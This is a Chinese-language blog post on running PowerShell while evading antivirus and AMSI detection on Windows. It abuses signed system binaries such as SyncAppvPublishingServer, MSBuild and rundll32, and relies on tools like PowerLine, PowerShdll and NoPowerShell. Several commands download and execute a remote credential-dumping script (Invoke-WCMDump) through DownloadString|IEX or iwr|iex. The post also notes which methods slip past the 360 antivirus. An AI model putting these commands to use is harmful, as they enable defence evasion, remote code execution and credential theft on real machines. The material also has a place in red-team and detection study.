\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[www.cnblogs.com\](https://www.cnblogs.com/-mo-/p/12692559.html)

### 0x01 简介

Windows PowerShell 是一种命令行外壳程序和脚本环境，使命令行用户和脚本编写者可以利用 .NET Framework 的强大功能。由于 powershell 的特性，使得它很受渗透测试爱好者的喜爱，当然也催生了像 ASMI 之类的防御手段，当然各类杀软也是把它纳入了查杀行列中，只要你调用 PS 就会查杀，今天列举一些可以绕过其检测规则的一些姿势，主要可以粗略分为两大类，首先是绕过 AV 的检测规则，其次是换一个方式执行类似 PowerShell 的操作

![](https://img2020.cnblogs.com/blog/1561366/202004/1561366-20200414083231553-1468059295.png)

### 0x02 绕过本地调用

#### 2.1 模糊搜索调用

```
forfiles /p %COMSPEC:~0,19% /s /c "@file -noe" /m po\*l.\*e


```

![](https://img2020.cnblogs.com/blog/1561366/202004/1561366-20200414084844354-1663760454.png)

#### 2.2 编译命令程序

用 c++ 的 system 函数库去调用 (待完善)：

```
#include<stdio.h>
#include<stdlib.h>
int main(){
system("powershell");
return 0;
}


```

#### 2.3 SyncAppvPublishingServer

SyncAppvPublishingServer 是 win10 自带的服务，有 vbs 和 exe 两个版本，我们可以使用他们来做一些类似 PS 的操作

默认存放在 C:\\Windows\\System32 下面：

![](https://img2020.cnblogs.com/blog/1561366/202004/1561366-20200414095248859-1239492508.png)

```
#弹计算器
C:\\Windows\\System32\\SyncAppvPublishingServer.vbs "Break; Start-Process Calc.exe ”

#访问端口
C:\\Windows\\System32\\SyncAppvPublishingServer.vbs "Break; iwr http://192.168.1.149:443"

#远程下载并执行powershell
C:\\Windows\\System32\\SyncAppvPublishingServer.exe \\" Break; (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/peewpw/Invoke-WCMDump/master/Invoke-WCMDump.ps1','$env:USERPROFILE/1.ps1'); Start-Process '$env:USERPROFILE/1.ps1' -WindowStyle Minimized;"

SyncAppvPublishingServer.exe "n;(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/peewpw/Invoke-WCMDump/master/Invoke-WCMDump.ps1') | IEX"



```

#### 2.4 调用 MSBuild

MSBuild 是. Net 框架中包含的工具，用于自动化创建软件产品的过程，包括编译源代码，打包，测试，部署和创建文档。Msbuild 依赖于. csproj 文件，该文件具有 XML 语法，包含了. NET 构建过程中的结果

github 上有此类项目：[https://github.com/Cn33liz/MSBuildShell.git](https://github.com/Cn33liz/MSBuildShell.git)

执行完之后会获得一个交互式的 PS：

```
C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe C:\\Scripts\\MSBuildShell.csproj
C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\msbuild.exe C:\\Scripts\\MSBuildShell.csproj


```

![](https://img2020.cnblogs.com/blog/1561366/202004/1561366-20200414102510538-1854198848.png)

#### 2.5 调用 cscript

三好师傅：[http://www.mottoin.com/detail/1961.html](http://www.mottoin.com/detail/1961.html)

### 0x03 非 Powershell 执行

#### 3.1 PowerLine

PowerLine 是一款由 c# 编写的工具，支持本地命令行调用和远程调用，可以在不直接调用 PowerShell 的情况下调用 PowerShell 脚本

下载地址：[https://github.com/fullmetalcache/PowerLine](https://github.com/fullmetalcache/PowerLine)

首先拉取项目到本地，然后运行 build.bat 文件：

```
./build.bat


```

然后在 UserConf.xml 文件中填写你所需要调用的 powershell 脚本的地址，默认自带 powerup、powerview、Mimikatz 等，只要按照他给定的格式加入你的 ps 脚本地址即可：  
![](https://img2020.cnblogs.com/blog/1561366/202004/1561366-20200414104138444-1655777677.png)

加入完成以后，运行 PLBuilder.exe 进行构建，构建过程中，360 无提示。查看内置的脚本 PowerLine.exe -ShowScripts：

![](https://img2020.cnblogs.com/blog/1561366/202004/1561366-20200414104312252-1052750333.png)

#### 3.2 PowerShdll

这个工具主要使用 dll 去运行 powershell 而不需要去连接 powershell.exe , 所以具有一定的 bypassAV 能力，当然它也可以在这几个程序下运行 rundll32.exe, installutil.exe, regsvcs.exe, regasm.exe, regsvr32.exe 或者使用作者给出的单独的 exe 进行执行

下载地址：[https://github.com/p3nt4/PowerShdll](https://github.com/p3nt4/PowerShdll)

```
#exe版
PowerShdll -i   #进入到交互模式

#dll版  360可以查杀到
rundll32 PowerShdll.dll,main . { iwr -useb https://raw.githubusercontent.com/peewpw/Invoke-WCMDump/master/Invoke-WCMDump.ps1 } ^| iex;


```

#### 3.3 Nopowershell

NoPowerShell 是用 C＃实现的工具，它支持执行类似 PowerShell 的命令，同时对任何 PowerShell 日志记录机制都不可见。同时也提供了 CS 下的 cna 脚本。

下载地址：[https://github.com/bitsadmin/nopowershell](https://github.com/bitsadmin/nopowershell)

```
./NoPowerShell.exe(过360)

rundll32 NoPowerShell64.dll(被查杀)


```

这里要注意一点的是，cs 的 cna 脚本默认调用 scripts 下的文件，国内的 cs 大多为 script 目录，自行修改文件内的目录即可。

### 参考链接

[无 powershell 运行 powershell 方法总结](https://mp.weixin.qq.com/s?__biz=MjM5MTYxNjQxOA==&mid=2652852749&idx=1&sn=8dfd8ea7d745cca58be663a538ee4093&chksm=bd592ec08a2ea7d660db587f6f1dc9d531dd957b2a397065e393399334310724b5aaf93002c3&mpshare=1&scene=1&srcid=&sharer_sharetime=1575103078873&sharer_shareid=56e432b8d4e8d9494f05afd447beb50f&pass_ticket=m9r3c%2FmzdGu1FzhP89tOMO81nBdPEflt7YQXa38HylQ%3D#rd)  
[http://www.mottoin.com/detail/1961.html](http://www.mottoin.com/detail/1961.html)